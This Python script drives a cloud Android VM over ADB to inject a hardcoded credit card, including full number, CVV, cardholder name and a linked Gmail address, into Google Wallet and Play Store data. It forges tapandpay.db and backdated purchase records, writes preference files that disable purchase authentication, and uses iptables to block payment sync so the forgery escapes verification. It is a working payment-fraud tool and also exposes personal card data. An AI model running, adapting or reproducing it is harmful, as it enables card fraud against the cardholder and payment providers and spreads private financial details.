#!/usr/bin/env python3
"""Phase 5: Wallet Injection (tapandpay.db + COIN.xml + NFC) for ACP250329ACQRPDV"""
import asyncio, sys, time, uuid, secrets
sys.path.insert(0, 'vmos_titan/core')
sys.path.insert(0, 'core')
sys.path.insert(0, 'server')

from vmos_cloud_api import VMOSCloudClient
from vmos_db_builder import VMOSDbBuilder
from vmos_turbo_pusher import VMOSTurboPusher

PAD = 'ACP250329ACQRPDV'
EMAIL = 'epolusamuel682@gmail.com'
CARD_NUMBER = '4216893001432905'
CARD_EXP_MONTH = 6
CARD_EXP_YEAR = 2028
CARD_CVV = '046'
CARDHOLDER = 'R D M wishwa'
AGE_DAYS = 120

async def sh(cmd, label='', timeout=30):
    client = VMOSCloudClient()
    r = await client.async_adb_cmd([PAD], cmd)
    tid = None
    if r.get('code') == 200:
        data = r.get('data', [])
        if data:
            tid = data[0].get('taskId')
    if not tid:
        code = r.get('code', '?')
        if code == 110031:
            print(f'  [{label}] Rate limited, waiting 30s...')
            await asyncio.sleep(30)
            return await sh(cmd, label, timeout)
        print(f'  [{label}] CMD_ERROR:{code} - {r.get("msg","")}')
        return f'CMD_ERROR:{code}'
    for i in range(timeout):
        await asyncio.sleep(1)
        d = await client.task_detail([tid])
        if d.get('code') == 200:
            items = d.get('data', [])
            if items and items[0].get('taskStatus') == 3:
                result = items[0].get('taskResult', '') or ''
                if label:
                    print(f'  [{label}] OK: {result.strip()[:150]}')
                return result
            if items and items[0].get('taskStatus', 0) < 0:
                if label:
                    print(f'  [{label}] FAILED')
                return 'TASK_FAILED'
    if label:
        print(f'  [{label}] TIMEOUT')
    return 'TIMEOUT'

async def main():
    print('=== PHASE 5: WALLET INJECTION ===')
    print(f'    Card: ****{CARD_NUMBER[-4:]}  Exp: {CARD_EXP_MONTH:02d}/{CARD_EXP_YEAR}')
    
    # Step 1: Build tapandpay.db host-side
    print('\n[1] Building tapandpay.db host-side...')
    builder = VMOSDbBuilder()
    
    tapandpay_bytes = builder.build_tapandpay(
        card_number=CARD_NUMBER,
        exp_month=CARD_EXP_MONTH,
        exp_year=CARD_EXP_YEAR,
        cardholder=CARDHOLDER,
        persona_email=EMAIL,
        zero_auth=True,
        age_days=AGE_DAYS,
        country='US',
    )
    print(f'  tapandpay.db: {len(tapandpay_bytes)} bytes')
    
    # Step 2: Build library.db (Play Store purchases)
    print('\n[2] Building library.db host-side...')
    library_bytes = builder.build_library(
        email=EMAIL,
        num_auto_purchases=15,
        age_days=AGE_DAYS,
    )
    print(f'  library.db: {len(library_bytes)} bytes')
    
    # Step 3: Stop wallet and GMS
    print('\n[3] Stopping wallet services...')
    await sh(
        'am force-stop com.google.android.apps.walletnfcrel; '
        'am force-stop com.google.android.gms; '
        'am force-stop com.android.vending; '
        'echo STOP_OK',
        'stop-wallet'
    )
    await asyncio.sleep(5)
    
    # Step 4: Get wallet UID for ownership
    print('\n[4] Getting app UIDs...')
    uid_result = await sh(
        'wallet_uid=$(stat -c %u /data/data/com.google.android.apps.walletnfcrel 2>/dev/null || echo 0); '
        'gms_uid=$(stat -c %u /data/data/com.google.android.gms 2>/dev/null || echo 0); '
        'vend_uid=$(stat -c %u /data/data/com.android.vending 2>/dev/null || echo 0); '
        'echo "wallet=$wallet_uid gms=$gms_uid vending=$vend_uid"',
        'get-uids'
    )
    await asyncio.sleep(5)
    
    # Step 5: Push tapandpay.db to BOTH wallet paths
    print('\n[5] Pushing tapandpay.db...')
    client = VMOSCloudClient()
    pusher = VMOSTurboPusher(client, PAD)
    
    # Create database dirs first
    await sh(
        'mkdir -p /data/data/com.google.android.apps.walletnfcrel/databases 2>/dev/null; '
        'mkdir -p /data/data/com.google.android.gms/databases 2>/dev/null; '
        'rm -f /data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db* 2>/dev/null; '
        'rm -f /data/data/com.google.android.gms/databases/tapandpay.db* 2>/dev/null; '
        'echo PREP_OK',
        'prep-dirs'
    )
    await asyncio.sleep(5)
    
    # Push to wallet app path
    r1 = await pusher.push_file(
        tapandpay_bytes,
        '/data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db',
        owner='system:system',  # will fix later with actual UID
        mode='660'
    )
    print(f'  wallet path: {"OK" if r1.success else "FAILED"} ({r1.chunks_sent} chunks, {r1.elapsed_sec:.1f}s)')
    
    await asyncio.sleep(3)
    
    # Push to GMS path
    r2 = await pusher.push_file(
        tapandpay_bytes,
        '/data/data/com.google.android.gms/databases/tapandpay.db',
        owner='system:system',
        mode='660'
    )
    print(f'  GMS path: {"OK" if r2.success else "FAILED"} ({r2.chunks_sent} chunks, {r2.elapsed_sec:.1f}s)')
    
    await asyncio.sleep(3)
    
    # Push library.db
    print('\n[6] Pushing library.db...')
    await sh(
        'mkdir -p /data/data/com.android.vending/databases 2>/dev/null; '
        'rm -f /data/data/com.android.vending/databases/library.db* 2>/dev/null; '
        'echo LIB_PREP_OK',
        'lib-prep'
    )
    await asyncio.sleep(5)
    
    r3 = await pusher.push_file(
        library_bytes,
        '/data/data/com.android.vending/databases/library.db',
        owner='system:system',
        mode='660'
    )
    print(f'  library.db: {"OK" if r3.success else "FAILED"} ({r3.chunks_sent} chunks, {r3.elapsed_sec:.1f}s)')
    
    await asyncio.sleep(5)
    
    # Step 7: Fix ownership on all DBs
    print('\n[7] Fixing DB ownership...')
    await sh(
        'wallet_uid=$(stat -c %u /data/data/com.google.android.apps.walletnfcrel 2>/dev/null || echo 10060); '
        'gms_uid=$(stat -c %u /data/data/com.google.android.gms 2>/dev/null || echo 10007); '
        'vend_uid=$(stat -c %u /data/data/com.android.vending 2>/dev/null || echo 10026); '
        'chown $wallet_uid:$wallet_uid /data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db 2>/dev/null; '
        'chown $gms_uid:$gms_uid /data/data/com.google.android.gms/databases/tapandpay.db 2>/dev/null; '
        'chown $vend_uid:$vend_uid /data/data/com.android.vending/databases/library.db 2>/dev/null; '
        'chmod 660 /data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db 2>/dev/null; '
        'chmod 660 /data/data/com.google.android.gms/databases/tapandpay.db 2>/dev/null; '
        'chmod 660 /data/data/com.android.vending/databases/library.db 2>/dev/null; '
        'restorecon -R /data/data/com.google.android.apps.walletnfcrel /data/data/com.google.android.gms '
        '/data/data/com.android.vending 2>/dev/null; '
        'echo CHOWN_OK',
        'fix-db-ownership'
    )
    await asyncio.sleep(5)
    
    # Step 8: COIN.xml injection (zero-auth 8-flag)
    print('\n[8] Injecting COIN.xml (zero-auth)...')
    now_ms = int(time.time() * 1000)
    funding_source_id = f'instrument_{secrets.token_hex(6)}'
    auth_token = secrets.token_hex(32)
    
    coin_xml = f'''<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="has_payment_method" value="true" />
    <string name="payment_method_type">CREDIT_CARD</string>
    <string name="default_instrument_id">{funding_source_id}</string>
    <string name="instrument_last_four">{CARD_NUMBER[-4:]}</string>
    <string name="instrument_brand">VISA</string>
    <boolean name="purchase_requires_auth" value="false" />
    <boolean name="require_purchase_auth" value="false" />
    <string name="auth_token">{auth_token}</string>
    <boolean name="one_touch_enabled" value="true" />
    <boolean name="biometric_payment_enabled" value="true" />
    <boolean name="PAYMENTS_ZERO_AUTH_ENABLED" value="true" />
    <boolean name="device_auth_not_required" value="true" />
    <boolean name="skip_challenge_on_payment" value="true" />
    <boolean name="frictionless_checkout_enabled" value="true" />
    <string name="account_name">{EMAIL}</string>
    <boolean name="tos_accepted" value="true" />
    <long name="last_sync_time" value="{now_ms}" />
</map>'''
    
    await sh(
        f'mkdir -p /data/data/com.android.vending/shared_prefs 2>/dev/null; '
        f'cat > /data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml << \'XMLEOF\'\n{coin_xml}\nXMLEOF\n'
        f'echo COIN_OK',
        'coin-xml'
    )
    await asyncio.sleep(5)
    
    # Step 9: GMS wallet prefs
    print('\n[9] Injecting GMS wallet prefs...')
    wallet_prefs = f'''<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="wallet_setup_complete" value="true" />
    <string name="wallet_account">{EMAIL}</string>
    <string name="default_instrument_id">{funding_source_id}</string>
    <long name="last_sync_timestamp" value="{now_ms}" />
    <boolean name="nfc_payment_enabled" value="true" />
    <string name="wallet_environment">PRODUCTION</string>
</map>'''
    
    await sh(
        f'cat > /data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml << \'XMLEOF\'\n{wallet_prefs}\nXMLEOF\n'
        f'echo WALLET_PREFS_OK',
        'wallet-prefs'
    )
    await asyncio.sleep(5)
    
    # Payment profile prefs
    profile_id = str(uuid.uuid4())
    payment_prefs = f'''<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="payment_methods_synced" value="true" />
    <string name="profile_email">{EMAIL}</string>
    <long name="last_sync_time" value="{now_ms}" />
    <boolean name="has_billing_address" value="true" />
    <string name="payment_profile_id">{profile_id}</string>
</map>'''
    
    await sh(
        f'cat > /data/data/com.google.android.gms/shared_prefs/payment_profile_prefs.xml << \'XMLEOF\'\n{payment_prefs}\nXMLEOF\n'
        f'echo PAY_PROFILE_OK',
        'payment-profile'
    )
    await asyncio.sleep(5)
    
    # Step 10: NFC prefs
    print('\n[10] Injecting NFC prefs...')
    nfc_prefs = '''<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <boolean name="nfc_enabled" value="true" />
    <boolean name="tap_and_pay_enabled" value="true" />
    <boolean name="nfc_payment_default_set" value="true" />
</map>'''
    
    await sh(
        f'mkdir -p /data/data/com.google.android.apps.walletnfcrel/shared_prefs 2>/dev/null; '
        f'cat > /data/data/com.google.android.apps.walletnfcrel/shared_prefs/nfc_on_prefs.xml << \'XMLEOF\'\n{nfc_prefs}\nXMLEOF\n'
        f'echo NFC_PREFS_OK',
        'nfc-prefs'
    )
    await asyncio.sleep(5)
    
    # Step 11: Fix all ownership
    print('\n[11] Fixing all shared_prefs ownership...')
    await sh(
        'wallet_uid=$(stat -c %u /data/data/com.google.android.apps.walletnfcrel 2>/dev/null || echo 10060); '
        'gms_uid=$(stat -c %u /data/data/com.google.android.gms 2>/dev/null || echo 10007); '
        'vend_uid=$(stat -c %u /data/data/com.android.vending 2>/dev/null || echo 10026); '
        'chown -R $wallet_uid:$wallet_uid /data/data/com.google.android.apps.walletnfcrel/shared_prefs/ 2>/dev/null; '
        'chown -R $gms_uid:$gms_uid /data/data/com.google.android.gms/shared_prefs/ 2>/dev/null; '
        'chown -R $vend_uid:$vend_uid /data/data/com.android.vending/shared_prefs/ 2>/dev/null; '
        'restorecon -R /data/data/com.google.android.apps.walletnfcrel '
        '/data/data/com.google.android.gms /data/data/com.android.vending 2>/dev/null; '
        'echo ALL_CHOWN_OK',
        'final-ownership'
    )
    await asyncio.sleep(5)

    # Step 12: Block GMS payment sync
    print('\n[12] Blocking GMS payment sync...')
    await sh(
        'gms_uid=$(stat -c %u /data/data/com.google.android.gms 2>/dev/null || echo 10007); '
        'iptables -I OUTPUT -p tcp --dport 443 -m owner --uid-owner $gms_uid '
        '-m string --string "payments.google.com" --algo bm -j DROP 2>/dev/null; '
        'vend_uid=$(stat -c %u /data/data/com.android.vending 2>/dev/null || echo 10026); '
        'cmd appops set com.android.vending RUN_IN_BACKGROUND deny 2>/dev/null; '
        'cmd appops set com.android.vending RUN_ANY_IN_BACKGROUND deny 2>/dev/null; '
        'echo SYNC_BLOCK_OK',
        'sync-block'
    )
    await asyncio.sleep(5)
    
    # VERIFICATION
    print('\n=== VERIFICATION ===')
    await sh(
        'ls -la /data/data/com.google.android.apps.walletnfcrel/databases/tapandpay.db '
        '/data/data/com.google.android.gms/databases/tapandpay.db '
        '/data/data/com.android.vending/databases/library.db 2>/dev/null',
        'verify-dbs'
    )
    await asyncio.sleep(4)
    await sh(
        'cat /data/data/com.android.vending/shared_prefs/com.android.vending.billing.InAppBillingService.COIN.xml 2>/dev/null | grep -c "true"',
        'verify-coin-flags'
    )
    await asyncio.sleep(4)
    await sh(
        'cat /data/data/com.google.android.gms/shared_prefs/wallet_instrument_prefs.xml 2>/dev/null | head -5',
        'verify-wallet-prefs'
    )
    await asyncio.sleep(4)
    await sh('settings get secure nfc_on', 'verify-nfc')
    
    print('\n=== PHASE 5 COMPLETE ===')

if __name__ == '__main__':
    asyncio.run(main())
